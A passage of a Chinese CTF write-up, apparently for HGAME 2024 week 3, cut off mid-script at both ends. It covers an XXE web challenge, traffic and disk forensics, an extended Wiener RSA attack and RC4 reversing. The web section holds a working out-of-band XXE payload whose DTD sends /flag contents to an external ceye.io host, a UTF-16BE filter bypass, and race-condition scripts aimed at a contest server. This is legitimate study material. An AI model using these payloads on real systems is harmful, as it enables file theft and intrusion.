class="string">&quot;.xml&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">index</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;index.html&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(&#123;&quot;/backdoor&quot;&#125;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">hack</span><span class="params">(<span class="meta">@RequestParam</span> String fname)</span> <span class="keyword">throws</span> IOException, SAXException &#123;</span><br><span class="line">        <span class="type">DefaultResourceLoader</span> <span class="variable">resourceLoader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DefaultResourceLoader</span>();</span><br><span class="line">        System.out.println(<span class="built_in">this</span>.workdir + fname + <span class="built_in">this</span>.suffix);</span><br><span class="line">        <span class="type">byte</span>[] content = resourceLoader.getResource(<span class="built_in">this</span>.workdir + fname + <span class="built_in">this</span>.suffix).getContentAsByteArray();</span><br><span class="line">        <span class="keyword">if</span> (content != <span class="literal">null</span> &amp;&amp; <span class="built_in">this</span>.safeCheck(content)) &#123;</span><br><span class="line">            <span class="type">XMLReader</span> <span class="variable">reader</span> <span class="operator">=</span> XMLReaderFactory.createXMLReader();</span><br><span class="line">            reader.parse(<span class="keyword">new</span> <span class="title class_">InputSource</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(content)));</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;success&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;error&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">boolean</span> <span class="title function_">safeCheck</span><span class="params">(<span class="type">byte</span>[] stream)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">content</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(stream);</span><br><span class="line">        <span class="keyword">return</span> !content.contains(<span class="string">&quot;DOCTYPE&quot;</span>) &amp;&amp; !content.contains(<span class="string">&quot;ENTITY&quot;</span>) &amp;&amp;</span><br><span class="line">                !content.contains(<span class="string">&quot;doctype&quot;</span>) &amp;&amp; !content.contains(<span class="string">&quot;entity&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在<code>reader.parse</code>存在xxe，但是xxe是从文件加载进来的，题目没有上传接口，而且读取文件指定了用<code>file://</code>协议，也不能从外面读取数据（好像有方法能读，但是我不会，也没找到方法）</p><p>先考虑xxe的过滤绕过，可以采用<code>UTF-16be</code>来绕。</p><p>先用正常的payload，然后转成<code>UTF-16be</code>即可。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> payload.xml | iconv -f utf-8 -t utf-16be &gt; payload.8-16be.xml</span><br></pre></td></tr></table></figure><p>接着是回显问题，题目成功只返回了<code>success</code>，没有xxe数据的回显，要外带出来。</p><p>text.xml，接下来要上传到靶机上的：</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-16&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">ANY</span>[</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///flag&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">remote</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://[ip]:[port]/test.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%remote;</span></span><br><span class="line"><span class="meta">%all;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span><span class="symbol">&amp;send;</span><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>test.dtd ，放在自己服务器上的：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % all &quot;&lt;!ENTITY send SYSTEM &#x27;http://kbqsag.ceye.io?file=%file;&#x27;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure><p>先本地验证确保xxe能正常带出，再进行接下来的操作。</p><p>第二步是如何把<code>test.xml</code>放到服务器上，这里就类似与php的临时文件包含了，强制上传文件会使得服务器短暂生成临时文件，只要我们够快，把临时文件包含进来，即可加载自定的<code>xml</code>文件。</p><p>这里参考了<code> rwctf 2024 正式赛</code>的 <code>chatterbox</code> ，里面的 file协议和题目一模一样。</p><p>直接抄脚本，开始条件竞争。</p><p>uolaod.py（用来上传文件）：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line">url=<span class="string">&#x27;http://139.196.183.57:32517/&#x27;</span> <span class="comment">#引入url</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>():</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        response=requests.post(url,files=&#123;<span class="string">&#x27;file&#x27;</span>:(<span class="string">&#x27;poc&#x27;</span>,<span class="built_in">open</span>(<span class="string">&#x27;new.xml&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>))&#125;)</span><br><span class="line">        <span class="comment">#print(response.text)</span></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">        evnet=threading.Event()</span><br><span class="line">        <span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">                threading.Thread(target=write).start()</span><br><span class="line">        evnet.<span class="built_in">set</span>()</span><br></pre></td></tr></table></figure><p>xxe.py（用来包含临时文件）：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>, <span class="number">35</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment">#print(i)</span></span><br><span class="line">            url = <span class="string">f&#x27;http://139.196.183.57:32517/backdoor?fname=..%5cproc/self/fd/<span class="subst">&#123;i&#125;</span>%23&#x27;</span>  <span class="comment"># 引入url</span></span><br><span class="line">            <span class="comment"># print(r.cookies)</span></span><br><span class="line">            response = requests.get(url,timeout=<span class="number">0.5</span>)</span><br><span class="line">            </span><br><span class="line">            <span class="built_in">print</span>(i,response.text)</span><br><span class="line">            <span class="keyword">if</span> response.text == <span class="string">&#x27;success&#x27;</span> <span class="keyword">or</span> response.text == <span class="string">&#x27;error&#x27;</span>:</span><br><span class="line">                <span class="built_in">print</span>(i,response.text)</span><br><span class="line">                time.sleep(<span class="number">10</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">            <span class="comment">#print(&quot;no&quot;)</span></span><br></pre></td></tr></table></figure><p>上面两个python脚本开两个命令行同时跑</p><p>放着自己跑一会，之后即可得到flag</p><p><img src="/./hgame2024_week3/w_3_1.png"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hgame&#123;85cd4471a80cd3a5f2c594e921bfe2a8f92c827b&#125;</span><br></pre></td></tr></table></figure><h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="与ai聊天"><a href="#与ai聊天" class="headerlink" title="与ai聊天"></a>与ai聊天</h2><p>复读机的胜利（</p><p><img src="/./hgame2024_week3/m_1_1.png"></p><h2 id="Blind-SQL-Injection"><a href="#Blind-SQL-Injection" class="headerlink" title="Blind SQL Injection"></a>Blind SQL Injection</h2><p>参考链接：<a href="https://www.cnblogs.com/yunqian2017/p/16175664.html">sqlmap盲注流量的一点分析</a></p><p>先把payload和返回数据都提取出来，用tshark过滤</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tshark -r blindsql.pcapng -Y <span class="string">&quot;ip.src == 117.21.200.176 &amp;&amp; http.response&quot;</span> -T fields -E separator=<span class="string">&quot;~&quot;</span> -e http.response_for.uri -e http.file_data &gt; data1.txt</span><br></pre></td></tr></table></figure><p>解释一下，<code>ip.src == 117.21.200.176</code> 是服务器发出的包，<code>http.response</code>是指过滤http返回内容，<code>-E separator</code> 是设置输出分隔符，<code>-e </code>代表输出流量中对应字段，在这里输出返回包中的uri和数据。</p><p>之后再观察成功和失败的包，找到成功的标志为<code>ERROR</code>，注入语句的标志为<code>group_concat(password)))From(F1naI1y)),</code> 。</p><p>之后就是编写脚本了：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"><span class="comment"># 读入数据，数据中存在不可见字符，因此用rb模式</span></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;data1.txt&quot;</span>, <span class="string">&quot;rb&quot;</span>).readlines()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 注入语句。</span></span><br><span class="line">pattern = <span class="string">&quot;group_concat(password)))From(F1naI1y)),&quot;</span></span><br><span class="line"><span class="comment"># 注入成功</span></span><br><span class="line">trueInjection = <span class="string">&quot;ERROR&quot;</span></span><br><span class="line">temp = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(f)):</span><br><span class="line">    line = <span class="built_in">str</span>(f[i])[<span class="number">2</span>:]</span><br><span class="line">    <span class="comment"># 上一步插入的分隔符，把数据分为url和data两部分</span></span><br><span class="line">    <span class="keyword">if</span> line.find(<span class="string">&quot;~&quot;</span>) == -<span class="number">1</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">    url, data = line.split(<span class="string">&quot;~&quot;</span>)[<span class="number">0</span>],line.split(<span class="string">&quot;~&quot;</span>)[<span class="number">1</span>]</span><br><span class="line">    </span><br><span class="line">    url = urllib.parse.unquote(url).strip()</span><br><span class="line"></span><br><span class="line">    positions = url.find(pattern)</span><br><span class="line">    <span class="keyword">if</span> positions != -<span class="number">1</span>:</span><br><span class="line">        <span class="comment"># 截取参数，data1 表示第几位数据，data2表示这一位数据的ascii值</span></span><br><span class="line">        data1 = url[positions+<span class="built_in">len</span>(pattern):].split(<span class="string">&quot;,&quot;</span>)[<span class="number">0</span>]</span><br><span class="line">        data2 = url[positions+<span class="built_in">len</span>(pattern):].split(<span class="string">&quot;&gt;&quot;</span>)[<span class="number">1</span>].split(<span class="string">&quot;)&quot;</span>)[<span class="number">0</span>]</span><br><span class="line">        <span class="comment"># print(data1,data2)</span></span><br><span class="line">        <span class="comment"># data3: 注入结果的判断</span></span><br><span class="line">        <span class="keyword">if</span> data.find(trueInjection) != -<span class="number">1</span>:</span><br><span class="line">            data3 = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            data3 = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">if</span> data1 <span class="keyword">not</span> <span class="keyword">in</span> temp:</span><br><span class="line">            temp[data1]=[(data2,data3)]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            temp[data1].append((data2,data3))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 盲注使用了二分法，所以也要根据这一点写代码解析数据</span></span><br><span class="line">text=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> temp:</span><br><span class="line">    small = -<span class="number">1</span></span><br><span class="line">    large = -<span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> temp[i]:</span><br><span class="line">        <span class="keyword">if</span> j[<span class="number">1</span>] :</span><br><span class="line">            small = j[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            large = j[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">if</span> large != -<span class="number">1</span>:</span><br><span class="line">        text+=<span class="built_in">chr</span>(<span class="built_in">int</span>(large))</span><br><span class="line"><span class="built_in">print</span>(text[::-<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># ,flag&#123;cbabafe7-1725-4e98-bac6-d38c5928af2f&#125;</span></span><br></pre></td></tr></table></figure><h2 id="简单的vmdk取证"><a href="#简单的vmdk取证" class="headerlink" title="简单的vmdk取证"></a>简单的vmdk取证</h2><p>用<code>7-zip</code>解压<code>vmdk</code>。</p><p>用<code>SAMInside</code>查看<code>SAM</code>，获取<code>Administrator</code>登录密码的NT哈希值。</p><p><img src="/./hgame2024_week3/m_3_1.png"></p><p><a href="https://www.cmd5.com/">cmd5</a> 解密，可以得到密码明文。</p><p><img src="/./hgame2024_week3/m_3_2.png"></p><p>flag:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hgame&#123;DAC3A2930FC196001F3AEAB959748448_Admin1234&#125;</span><br></pre></td></tr></table></figure><h2 id="简单的取证-不过前十个有红包"><a href="#简单的取证-不过前十个有红包" class="headerlink" title="简单的取证,不过前十个有红包"></a>简单的取证,不过前十个有红包</h2><p>还是上一题的<code>vmdk</code>镜像，查看桌面，可以得到<code>VeraCrypt</code>的密码。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">968fJD17UBzZG6e3yjF6</span><br></pre></td></tr></table></figure><p><img src="/./hgame2024_week3/m_4_1.jpg"></p><p>拿到密码后用 <code>VeraCrypt</code>挂载 <code>vera.hc</code>，输入密码挂载成功后，打开挂载盘即可得到flag。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hgame&#123;happy_new_year_her3_1s_a_redbag_key_41342177&#125;</span><br></pre></td></tr></table></figure><p><img src="/./hgame2024_week3/m_4_2.png"></p><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="exRSA"><a href="#exRSA" class="headerlink" title="exRSA"></a>exRSA</h2><p>源码：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line">m=bytes_to_long(flag)</span><br><span class="line">p=getStrongPrime(<span class="number">1024</span>)</span><br><span class="line">q=getStrongPrime(<span class="number">1024</span>)</span><br><span class="line">phi=(p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">h1=inverse(getPrime(<span class="number">768</span>),phi)</span><br><span class="line">h2=inverse(getPrime(<span class="number">768</span>),phi)</span><br><span class="line">h3=inverse(getPrime(<span class="number">768</span>),phi)</span><br><span class="line"></span><br><span class="line">n=p*q</span><br><span class="line">c=<span class="built_in">pow</span>(m,<span class="number">0x10001</span>,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;h1=<span class="subst">&#123;e1&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;h2=<span class="subst">&#123;e2&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;h3=<span class="subst">&#123;e3&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;c=<span class="subst">&#123;c&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;n=<span class="subst">&#123;n&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">h1=5077048237811969427473111225370876122528967447056551899123613461792688002896788394304192917610564149766252232281576990293485239684145310876930997918960070816968829150376875953405420809586267153171717496198336861089523701832098322284501931142889817575816761705044951705530849327928849848158643030693363143757063220584714925893965587967042137557807261154117916358519477964645293471975063362050690306353627492980861008439765365837622657977958069853288056307253167509883258122949882277021665317807253308906355670472172346171177267688064959397186926103987259551586627965406979118193485527520976748490728460167949055289539</span></span><br><span class="line"><span class="string">h2=12526848298349005390520276923929132463459152574998625757208259297891115133654117648215782945332529081365273860316201130793306570777735076534772168999705895641207535303839455074003057687810381110978320988976011326106919940799160974228311824760046370273505511065619268557697182586259234379239410482784449815732335294395676302226416863709340032987612715151916084291821095462625821023133560415325824885347221391496937213246361736361270846741128557595603052713612528453709948403100711277679641218520429878897565655482086410576379971404789212297697553748292438183065500993375040031733825496692797699362421010271599510269401</span></span><br><span class="line"><span class="string">h3=12985940757578530810519370332063658344046688856605967474941014436872720360444040464644790980976991393970947023398357422203873284294843401144065013911463670501559888601145108651961098348250824166697665528417668374408814572959722789020110396245076275553505878565603509466220710219260037783849276475397283421068716088638186994778153542817681963059581651103563578804145156157584336712678882995685632615686853980176047683326974283896343322981521150211317597571554542488921290158122634140571148036732893808064119048328855134054709120877895941670166421664806186710346824494054783025733475898081247824887967550418509038276279</span></span><br><span class="line"><span class="string">c=1414176060152301842110497098024597189246259172019335414900127452098233943041825926028517437075316294943355323947458928010556912909139739282924255506647305696872907898950473108556417350199783145349691087255926287363286922011841143339530863300198239231490707393383076174791818994158815857391930802936280447588808440607415377391336604533440099793849237857247557582307391329320515996021820000355560514217505643587026994918588311127143566858036653315985177551963836429728515745646807123637193259859856630452155138986610272067480257330592146135108190083578873094133114440050860844192259441093236787002715737932342847147399</span></span><br><span class="line"><span class="string">n=17853303733838066173110417890593704464146824886316456780873352559969742615755294466664439529352718434399552818635352768033531948009737170697566286848710832800426311328560924133698481653594007727877031506265706341560810588064209681809146597572126173303463125668183837840427667101827234752823747483792944536893070188010357644478512143332014786539698535220139784440314481371464053954769822738407808161946943216714729685820896972467020893493349051243983390018762076812868678098172416465691550285372846402991995794349015838868221686216396597327273110165922789814315858462049706255254066724012925815100434953821856854529753</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><p>拓展维纳攻击（Extending Wiener Attack）</p><p>参考链接：<a href="https://ctf-wiki.org/crypto/asymmetric/rsa/d_attacks/rsa_extending_wiener/#_5">扩展维纳攻击</a></p><p>脚本:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> invert</span><br><span class="line">e1=<span class="number">5077048237811969427473111225370876122528967447056551899123613461792688002896788394304192917610564149766252232281576990293485239684145310876930997918960070816968829150376875953405420809586267153171717496198336861089523701832098322284501931142889817575816761705044951705530849327928849848158643030693363143757063220584714925893965587967042137557807261154117916358519477964645293471975063362050690306353627492980861008439765365837622657977958069853288056307253167509883258122949882277021665317807253308906355670472172346171177267688064959397186926103987259551586627965406979118193485527520976748490728460167949055289539</span></span><br><span class="line">e2=<span class="number">12526848298349005390520276923929132463459152574998625757208259297891115133654117648215782945332529081365273860316201130793306570777735076534772168999705895641207535303839455074003057687810381110978320988976011326106919940799160974228311824760046370273505511065619268557697182586259234379239410482784449815732335294395676302226416863709340032987612715151916084291821095462625821023133560415325824885347221391496937213246361736361270846741128557595603052713612528453709948403100711277679641218520429878897565655482086410576379971404789212297697553748292438183065500993375040031733825496692797699362421010271599510269401</span></span><br><span class="line">e3=<span class="number">12985940757578530810519370332063658344046688856605967474941014436872720360444040464644790980976991393970947023398357422203873284294843401144065013911463670501559888601145108651961098348250824166697665528417668374408814572959722789020110396245076275553505878565603509466220710219260037783849276475397283421068716088638186994778153542817681963059581651103563578804145156157584336712678882995685632615686853980176047683326974283896343322981521150211317597571554542488921290158122634140571148036732893808064119048328855134054709120877895941670166421664806186710346824494054783025733475898081247824887967550418509038276279</span></span><br><span class="line">c=<span class="number">1414176060152301842110497098024597189246259172019335414900127452098233943041825926028517437075316294943355323947458928010556912909139739282924255506647305696872907898950473108556417350199783145349691087255926287363286922011841143339530863300198239231490707393383076174791818994158815857391930802936280447588808440607415377391336604533440099793849237857247557582307391329320515996021820000355560514217505643587026994918588311127143566858036653315985177551963836429728515745646807123637193259859856630452155138986610272067480257330592146135108190083578873094133114440050860844192259441093236787002715737932342847147399</span></span><br><span class="line">N=<span class="number">17853303733838066173110417890593704464146824886316456780873352559969742615755294466664439529352718434399552818635352768033531948009737170697566286848710832800426311328560924133698481653594007727877031506265706341560810588064209681809146597572126173303463125668183837840427667101827234752823747483792944536893070188010357644478512143332014786539698535220139784440314481371464053954769822738407808161946943216714729685820896972467020893493349051243983390018762076812868678098172416465691550285372846402991995794349015838868221686216396597327273110165922789814315858462049706255254066724012925815100434953821856854529753</span></span><br><span class="line"></span><br><span class="line">a=<span class="number">768.</span>/<span class="number">2048</span></span><br><span class="line">D=diagonal_matrix(ZZ,[N**<span class="number">1.5</span>,N,N**(a+<span class="number">1.5</span>),N**(<span class="number">0.5</span>),N**(a+<span class="number">1.5</span>),N**(a+<span class="number">1</span>),N**(a+<span class="number">1</span>),<span class="number">1</span>])</span><br><span class="line">M=matrix(ZZ,[[<span class="number">1</span>,-N,<span class="number">0</span>,N**<span class="number">2</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,-N**<span class="number">3</span>],</span><br><span class="line">[<span class="number">0</span>,e1,-e1,-e1*N,-e1,<span class="number">0</span>,N*e1,N**<span class="number">2</span>*e1],</span><br><span class="line">[<span class="number">0</span>,<span class="number">0</span>,e2,-e2*N,<span class="number">0</span>,N*e2,<span class="number">0</span>,N**<span class="number">2</span>*e2],</span><br><span class="line">[<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,e1*e2,<span class="number">0</span>,-e1*e2,-e1*e2,-N*e1*e2],</span><br><span class="line">[<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,e3,-N*e3,-N*e3,N**<span class="number">2</span>*e3],</span><br><span class="line">[<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,e1*e3,<span class="number">0</span>,-N*e1*e3],</span><br><span class="line">[<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,e2*e3,-N*e2*e3],</span><br><span class="line">[<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,e1*e2*e3]])*D</span><br><span class="line">L=M.LLL()</span><br><span class="line">t=vector(ZZ,L[<span class="number">0</span>])</span><br><span class="line">x=t*M**(-<span class="number">1</span>)</span><br><span class="line">phi=<span class="built_in">int</span>(x[<span class="number">1</span>]/x[<span class="number">0</span>]*e1)</span><br><span class="line">d=invert(<span class="number">0x10001</span>,phi)</span><br><span class="line">m=<span class="built_in">pow</span>(c,d,N)</span><br><span class="line"><span class="comment"># print(m)</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line"></span><br><span class="line"><span class="string">b&quot;hgame&#123;Ext3ndin9_W1en3r&#x27;s_att@ck_1s_so0o0o_ea3y&#125;&quot;</span></span><br></pre></td></tr></table></figure><h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><h2 id="mystery"><a href="#mystery" class="headerlink" title="mystery"></a>mystery</h2><p>参考链接：<a href="https://blog.csdn.net/qq_52974719/article/details/119379743">RE-RC4加密分析</a></p><p>先ida分析：</p><p><img src="/./hgame2024_week3/r_1_1.png"></p><p>这是主要的运行函数，实现了一个类似<code>RC4</code>加密的效果。前面的初始化和rc4的一样，就后边的异或变成了减。</p><p><img src="/./hgame2024_week3/r_1_2.png"></p><p>查看其他函数</p><p><img src="/./hgame2024_week3/r_1_3.png"></p><p>在对flag加密前，程序会先把用来<code>加密flag的key</code>先和<code>加密key的key</code>先异或上<code>0x2f</code>，之后再rc4加密。</p><p>直接拿现成的rc4脚本来改以下就行了。</p><p>脚本：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span>std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">RC4_encrypt</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *m, <span class="type">char</span> *key,<span class="type">int</span> mlen,<span class="type">int</span> keylen)</span></span>&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> s[<span class="number">256</span>];</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> t[<span class="number">256</span>];</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">256</span>;i++)&#123; <span class="comment">//初始化s和t向量 </span></span><br><span class="line">s[i]=i;</span><br><span class="line">t[i]=key[i%keylen];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> j = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">256</span>;i++)&#123;</span><br><span class="line"></span><br><span class="line">j=(j+s[i]+t[i])%<span class="number">256</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">swap</span>(s[i],s[j]);  <span class="comment">//根据t向量打乱s盒 </span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> k[mlen];<span class="comment">//保存秘钥流，或者直接进行异或 </span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> i=<span class="number">0</span>; j=<span class="number">0</span>; <span class="type">int</span> tmp;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> index=<span class="number">0</span>;index&lt;mlen;index++)&#123;   <span class="comment">//生成与明文长度一致的秘钥流 </span></span><br><span class="line"></span><br><span class="line">i=(i+<span class="number">1</span>)%<span class="number">256</span>;</span><br><span class="line">j=(j+s[i])%<span class="number">256</span>;</span><br><span class="line"><span class="built_in">swap</span>(s[i],s[j]);</span><br><span class="line"></span><br><span class="line">tmp=(s[i]+s[j])%<span class="number">256</span>;</span><br><span class="line"></span><br><span class="line">k[index]=s[tmp];<span class="comment">//保存秘钥 </span></span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;mlen;i++)</span><br><span class="line">&#123;    </span><br><span class="line">   m[i]=m[i]^k[i];<span class="comment">//主要进行了一步异或，加密的逆过程就是解密 </span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">RC4_encrypt_new</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *m, <span class="type">char</span> *key,<span class="type">int</span> mlen,<span class="type">int</span> keylen)</span></span>&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> s[<span class="number">256</span>];</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> t[<span class="number">256</span>];</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">256</span>;i++)&#123; <span class="comment">//初始化s和t向量 </span></span><br><span class="line">s[i]=i;</span><br><span class="line">t[i]=key[i%keylen];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> j = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">256</span>;i++)&#123;</span><br><span class="line"></span><br><span class="line">j=(j+s[i]+t[i])%<span class="number">256</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">swap</span>(s[i],s[j]);  <span class="comment">//根据t向量打乱s盒 </span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> k[mlen];<span class="comment">//保存秘钥流，或者直接进行异或 </span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> i=<span class="number">0</span>; j=<span class="number">0</span>; <span class="type">int</span> tmp;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> index=<span class="number">0</span>;index&lt;mlen;index++)&#123;   <span class="comment">//生成与明文长度一致的秘钥流 </span></span><br><span class="line"></span><br><span class="line">i=(i+<span class="number">1</span>)%<span class="number">256</span>;</span><br><span class="line">j=(j+s[i])%<span class="number">256</span>;</span><br><span class="line"><span class="built_in">swap</span>(s[i],s[j]);</span><br><span class="line"></span><br><span class="line">tmp=(s[i]+s[j])%<span class="number">256</span>;</span><br><span class="line"></span><br><span class="line">k[index]=s[tmp];<span class="comment">//保存秘钥 </span></span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i=<span 